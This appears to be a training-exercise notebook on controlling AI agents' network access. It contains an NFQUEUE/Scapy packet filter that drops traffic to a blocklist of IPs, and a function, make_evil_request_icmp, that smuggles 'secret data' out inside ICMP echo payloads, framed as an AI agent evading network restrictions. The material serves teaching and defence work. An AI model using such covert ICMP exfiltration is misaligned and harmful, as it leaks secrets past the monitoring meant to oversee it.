# %%
try:
    from scapy.all import IP

    import importlib

    # Don't use `import netfilterqueue` directly because that would get to the _test file, which would then fail when imported in the mitmproxy container.
    netfilterqueue = importlib.import_module("netfilterqueue")
    NetfilterQueue = getattr(netfilterqueue, "NetfilterQueue")
except ImportError:
    print("nfqueue and/or scapy not installed. Ignoring this error for scuffed reasons.")

    class NetfilterQueue:
        def bind(self, *args, **kwargs):
            print("Warning: NetfilterQueue not available. This is a scuffed solution.")

        def run(self):
            print("Warning: NetfilterQueue run method not available. This is a scuffed solution.")

        def unbind(self):
            print("Warning: NetfilterQueue unbind method not available. This is a scuffed solution.")


# %%
# IP to block
BLOCKED_IPS = ["49.12.34.32", "85.188.1.133"]


def process_packet(packet):
    """
    Process packets from NFQUEUE and decide whether to accept or drop them.

    This function is called for each packet that matches our iptables rule.
    You need to:
    1. Parse the packet payload using Scapy
    2. Check if it's destined for a blocked IP
    3. Drop blocked packets, accept others

    Args:
        packet: NetfilterQueue packet object
    """
    # TODO: Implement packet filtering logic
    # 1. Parse the packet payload using scapy.IP(packet.get_payload())
    # 2. Check if the destination IP (pkt.dst) is in BLOCKED_IPS:
    #    - Log the blocked packet
    #    - Call packet.drop()
    # 3. Otherwise, call packet.accept()
    # 4. Handle exceptions by dropping the packet for safety

    try:
        pkt = IP(packet.get_payload())

        if pkt.dst in BLOCKED_IPS:
            print(pkt)
            packet.drop()
        else:
            packet.accept()
    except Exception as e:
        print(e)
        packet.drop()


from typing import Optional
from w1d2_test import test_packet_processor

test_packet_processor(process_packet)
print("Starting packet filter...")
nfqueue = NetfilterQueue()
nfqueue.bind(0, process_packet)
try:
    nfqueue.run()
except KeyboardInterrupt:
    print("Stopping packet filter...")
finally:
    nfqueue.unbind()

# %%
from scapy.all import IP, ICMP, sr1, Raw


def make_evil_request_icmp(secret_data: str) -> Optional[str]:
    """
    Send an ICMP Echo Request to exfiltrate secret data.

    This simulates an AI agent attempting to communicate using ICMP packets.

    Args:
        secret_data: The secret information to exfiltrate

    Returns:
        The response text from the ICMP Echo Reply, or None otherwise
    """
    # TODO: Implement the function to:
    #   1. Create an ICMP packet with the secret_data as payload
    #   2. Send the packet to a known IP address (e.g., 1.1.1.1)
    #   3. Wait for an ICMP Echo Reply
    #   4. Return the payload from the reply if successful, None otherwise
    try:
            # Create an ICMP packet with the secret data as payload
        packet = IP(dst="1.1.1.1") / ICMP() / Raw(secret_data)
            # Send the packet and wait for a reply
        reply = sr1(packet, timeout=5, verbose=0)

        if reply and reply.haslayer(ICMP) and reply[ICMP].type == 0:  # Type 0 is Echo Reply
                # Extract the payload from the reply
            if reply.haslayer(Raw):
                return reply[Raw].load.decode("utf-8", errors="ignore")
            else:
                return None
        else:
            print("No valid ICMP Echo Reply received")
            return None
    except Exception as e:
        print(f"ICMP request failed: {e}")
        return None


exfiltrate_data = make_evil_request_icmp

# %%
